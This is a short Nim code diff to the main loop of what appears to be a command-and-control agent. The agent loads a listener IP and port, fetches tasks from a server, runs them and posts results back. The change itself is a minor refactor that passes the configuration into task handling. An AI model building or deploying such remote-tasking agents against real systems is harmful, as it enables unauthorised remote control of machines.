@@ -26,7 +26,7 @@ proc main() =
         echo "Missing agent configuration."
         quit(0)
 
-    let config = AgentConfig(
+    var config = AgentConfig(
         listener: ListenerUuid,
         ip: ListenerIp, 
         port: ListenerPort, 
@@ -60,7 +60,7 @@ proc main() =
         
         # Execute all retrieved tasks and return their output to the server
         for task in tasks: 
-            let result = task.handleTask()
+            let result = task.handleTask(config)
             discard config.postResults(agent, result)
             
 when isMainModule: 
